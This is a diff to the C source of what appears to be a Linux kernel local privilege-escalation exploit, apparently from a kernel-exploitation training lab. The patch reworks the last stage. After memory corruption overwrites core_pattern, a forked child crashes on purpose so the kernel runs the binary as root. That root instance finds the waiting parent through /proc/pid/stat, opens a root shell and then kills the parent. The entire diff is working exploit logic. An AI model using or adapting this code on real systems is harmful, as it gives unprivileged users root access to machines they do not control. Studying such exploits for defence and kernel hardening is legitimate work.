@@ -42,6 +42,7 @@
 #include <sys/user.h>
 #include <sys/sendfile.h>
 #include <linux/limits.h>
+#include <linux/taskstats.h>
 #include "drill.h"
 
 #define STR_EXPAND(arg) #arg
@@ -233,6 +234,7 @@ void wait_and_trigger_core_dump(void)
 	int core_pattern_fd = -1;
 	int memfd = -1;
 	int self_fd = -1;
+	pid_t pid = -1;
 
 	ret = do_cpu_pinning(1);
 	if (ret == EXIT_FAILURE)
@@ -275,12 +277,24 @@ void wait_and_trigger_core_dump(void)
 	if (ret == EXIT_FAILURE)
 		goto err;
 
-	/*
-	 * Trigger a program crash and provoke creating a core dump. The corrupted
-	 * core_pattern makes the kernel run this binary with root privileges.
-	 */
-	printf("[+] core_pattern is changed, create a core dump\n");
-	*(char *)0 = 0;
+	/* Create one more child to provoke a core dump */
+	pid = fork();
+	if (pid < 0) {
+		perror("[-] fork");
+		goto err;
+	}
+
+	if (pid == 0) {
+		/*
+		 * Trigger a program crash and provoke creating a core dump. The corrupted
+		 * core_pattern makes the kernel run this binary with root privileges.
+		 */
+		printf("[+] core_pattern is changed, create a core dump\n");
+		*(char *)0 = 0;
+	}
+
+	/* Now happily wait for a finishing signal from the root program */
+	pause(); /* should not return */
 
 err:
 	if (core_pattern_fd >= 0) {
@@ -375,6 +389,33 @@ err:
 	return EXIT_FAILURE;
 }
 
+pid_t get_parent_pid(pid_t child_pid)
+{
+	char proc_pid_stat[PATH_MAX] = { 0 };
+	FILE *stat_stream = NULL;
+	int ret = -1;
+	pid_t pid = -1;
+	char comm[TS_COMM_LEN] = { 0 };
+	char state = 0;
+	pid_t ppid = -1;
+
+	snprintf(proc_pid_stat, sizeof(proc_pid_stat), "/proc/%d/stat", child_pid);
+	stat_stream = fopen(proc_pid_stat, "r");
+	if (stat_stream == NULL) {
+		perror("[-] fopen /proc/pid/stat");
+		return -1;
+	}
+
+	ret = fscanf(stat_stream, "%d %s %c %d ", &pid, comm, &state, &ppid);
+	if (ret != 4) {
+		printf("[-] parsing /proc/pid/stat failed\n");
+		return -1;
+	}
+
+	printf("[+] got info about the dumped process: %d %s %c %d\n", pid, comm, state, ppid);
+	return ppid;
+}
+
 int main(int argc, char **argv)
 {
 	pid_t pid = -1;
@@ -385,6 +426,8 @@ int main(int argc, char **argv)
 	int spray_fd = -1;
 
 	if (argc > 1) {
+		pid_t ppid = -1;
+
 		/*
 		 * The kernel executes this program with one argument from the core dump helper.
 		 * The argument is pid of the process that provoked the core dump.
@@ -403,15 +446,34 @@ int main(int argc, char **argv)
 			return EXIT_FAILURE;
 		}
 
+		ppid = get_parent_pid(pid);
+		if (ppid < 0) {
+			printf("[-] failed to get the parent pid of the dumped process\n");
+			return EXIT_FAILURE;
+		}
+
+		printf("[+] gonna run root shell\n");
 		run_sh();
+
+		/*
+		 * The root shell is finished, let's send a signal to the parent
+		 * of the dumped process (it is waiting for us).
+		 */
+		ret = kill(ppid, SIGTERM);
+		if (ret < 0) {
+			perror("[-] sending a signal to parent failed\n");
+			return EXIT_FAILURE;
+		}
+
+		printf("[+] a terminating signal is sent to parent, now bye!\n");
 
 		return EXIT_SUCCESS;
 	}
 
 	/*
-	 * In the parent process we perform the memory corruption, and in the child
-	 * process we wait for the changed core_pattern and trigger a crash to get
-	 * privilege escalation.
+	 * In the child process we execute a ROP-chain that performs the memory corruption
+	 * and hangs in msleep(). In the parent process we wait for the changed core_pattern
+	 * and trigger a core dump to get privilege escalation.
 	 */
 	pid = fork();
 	if (pid < 0) {
@@ -419,7 +481,7 @@ int main(int argc, char **argv)
 		goto end;
 	}
 
-	if (pid == 0) {
+	if (pid != 0) {
 		wait_and_trigger_core_dump(); /* should not return */
 		printf("[-] core_pattern trick failed\n");
 		return EXIT_FAILURE;
